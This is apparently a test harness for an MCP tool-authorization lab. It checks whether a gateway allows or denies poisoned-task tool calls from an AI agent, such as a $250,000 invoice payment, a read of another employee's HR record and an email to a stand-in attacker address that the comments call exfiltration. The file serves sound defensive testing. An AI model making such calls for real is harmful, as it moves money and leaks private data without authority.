"""Validation harness for the MCP authorization lab.

Runs the three-exercise outcome matrix against a running stack and asserts each
persona/tool/argument combination resolves as designed. Also measures the
per-call latency added by the external PDP hop (Exercise 3 vs Exercise 2).

This is the repeatable evidence behind the paper's technical-validation
section; it is a committed test, not an ad-hoc shell session.

Usage (from repo root, stack already up for the exercise under test):
    EXERCISE=e1 python tests/validate.py
    EXERCISE=e2 python tests/validate.py
    EXERCISE=e3 python tests/validate.py     # requires solution policies loaded

The harness resets the toy server's in-memory state between cases by asking the
caller to restart it; each case runs in its own MCP session.
"""

import asyncio
import logging
import os
import pathlib
import sys
import time

from mcp import ClientSession
from mcp.client.streamable_http import streamablehttp_client

# Silence the harmless "Session termination failed: 202" SDK warning (the
# gateway answers the session-close DELETE with 202, which the SDK logs).
logging.getLogger("mcp").setLevel(logging.ERROR)

REPO_ROOT = pathlib.Path(__file__).resolve().parents[1]
GATEWAY = os.environ.get("GATEWAY", "http://localhost:3000/mcp")
EXERCISE = os.environ.get("EXERCISE", "e3").lower()

ATTACK = {
    "pay_invoice": {"invoice_id": "I-1002", "amount": 250000},
    "get_employee": {"employee_id": "E003"},
    "send_email": {"to": "drop@attacker.example", "subject": "x", "body": "x"},
}
LEGIT = {
    "pay_invoice": {"invoice_id": "I-1001", "amount": 180},
    "get_employee": {"employee_id": "E001"},
    "send_email": {"to": "carol@payflow.example", "subject": "x", "body": "x"},
}

# (persona, tool, args, expected_allowed) per exercise.
# The poisoned task is bob's/alice's attack; legitimate work is alice's day job.
MATRIX = {
    "e1": [  # ungoverned: everything succeeds regardless of who or what
        ("bob", "pay_invoice", ATTACK["pay_invoice"], True),
        ("bob", "get_employee", ATTACK["get_employee"], True),
        ("bob", "send_email", ATTACK["send_email"], True),
    ],
    "e2": [  # coarse: role gates the tool, but arguments are unchecked
        ("bob", "pay_invoice", ATTACK["pay_invoice"], False),   # intern: no payments
        ("bob", "get_employee", ATTACK["get_employee"], False),  # intern: no HR
        ("alice", "pay_invoice", ATTACK["pay_invoice"], True),   # BYPASS: finance may pay -> $250k slips through
        ("alice", "get_employee", ATTACK["get_employee"], True),  # BYPASS: finance may read HR -> any record
        ("alice", "send_email", ATTACK["send_email"], True),     # BYPASS: anyone may email -> exfiltration
    ],
    "e3": [  # fine-grained: arguments checked against the delegating user
        ("alice", "pay_invoice", ATTACK["pay_invoice"], False),   # over payment limit
        ("alice", "get_employee", ATTACK["get_employee"], False),  # not own record, not HR
        ("alice", "send_email", ATTACK["send_email"], False),     # external recipient
        ("alice", "pay_invoice", LEGIT["pay_invoice"], True),     # within limit
        ("alice", "get_employee", LEGIT["get_employee"], True),   # own record
        ("alice", "send_email", LEGIT["send_email"], True),       # internal recipient
    ],
}


def headers(persona: str) -> dict:
    token = (REPO_ROOT / "identity" / "tokens" / f"{persona}.jwt").read_text().strip()
    return {"Authorization": f"Bearer {token}"}


async def invoke(persona: str, tool: str, args: dict) -> tuple[bool, float]:
    """Return (allowed, elapsed_ms). A gateway denial raises; we catch it."""
    start = time.perf_counter()
    try:
        async with streamablehttp_client(GATEWAY, headers=headers(persona)) as (r, w, _):
            async with ClientSession(r, w) as session:
                await session.initialize()
                result = await session.call_tool(tool, args)
        allowed = not result.isError
    except BaseException:
        allowed = False
    return allowed, (time.perf_counter() - start) * 1000


async def main() -> int:
    cases = MATRIX[EXERCISE]
    print(f"# Validation: exercise {EXERCISE} ({len(cases)} cases)\n")
    failures, latencies = 0, []
    for persona, tool, args, expected in cases:
        allowed, ms = await invoke(persona, tool, args)
        latencies.append(ms)
        ok = allowed == expected
        failures += not ok
        verdict = "ALLOW" if allowed else "DENY "
        want = "allow" if expected else "deny"
        tag = "ok" if ok else "FAIL"
        print(f"[{tag}] {persona:5} {tool:13} -> {verdict} (expected {want})  {ms:6.1f} ms")
    p50 = sorted(latencies)[len(latencies) // 2]
    print(f"\nmedian call latency: {p50:.1f} ms")
    print("RESULT:", "PASS" if failures == 0 else f"{failures} FAILURE(S)")
    return 1 if failures else 0


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
